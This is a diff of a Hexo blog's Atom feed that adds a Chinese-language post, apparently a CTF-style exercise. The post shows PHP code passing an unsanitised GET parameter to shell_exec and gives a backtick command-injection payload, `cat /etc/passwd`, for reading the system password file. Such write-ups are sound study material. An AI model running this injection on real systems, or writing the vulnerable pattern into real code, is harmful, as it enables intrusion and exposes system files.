@@ -6,7 +6,7 @@
   <link href="https://izero8.github.io/atom.xml" rel="self"/>
   
   <link href="https://izero8.github.io/"/>
-  <updated>2022-04-23T20:05:33.244Z</updated>
+  <updated>2022-04-26T10:01:55.813Z</updated>
   <id>https://izero8.github.io/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PHP没有echo的回显(Linux)</title>
+    <link href="https://izero8.github.io/2022/04/26/PHP%E6%B2%A1%E6%9C%89echo%E7%9A%84%E5%9B%9E%E6%98%BE-Linux/"/>
+    <id>https://izero8.github.io/2022/04/26/PHP%E6%B2%A1%E6%9C%89echo%E7%9A%84%E5%9B%9E%E6%98%BE-Linux/</id>
+    <published>2022-04-26T09:58:10.000Z</published>
+    <updated>2022-04-26T10:01:55.813Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h1><p>请构造出可以查看密码配置文件的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">$output = shell_exec(&quot;ping -c 5 $ip&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果传入的IP因为某种原因未能解析为IP会导致错误，而输出的部分正好可控</p><p>可以ping整个文件的内容，必然不能解析，报错时就会将整个文件的内容显示在报错信息中。</p><p>在Linux中反引号表示执行命令，在命令执行时，会优先执行其中的命令，返回执行的结果。</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `whoami`</span><br></pre></td></tr></table></figure><p>以上命令执行时会先执行whoami，然后再执行echo输出whoami的内容。<br>然后我们就可以构造payload来读取目标的密码配置文件了。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat /etc/passwd`</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;代码如下&quot;&gt;&lt;a href=&quot;#代码如下&quot; class=&quot;headerlink&quot; title=&quot;代码如下&quot;&gt;&lt;/a&gt;代码如下&lt;/h1&gt;&lt;p&gt;请构造出可以查看密码配置文件的payload&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>PHPStudy代码执行后门</title>
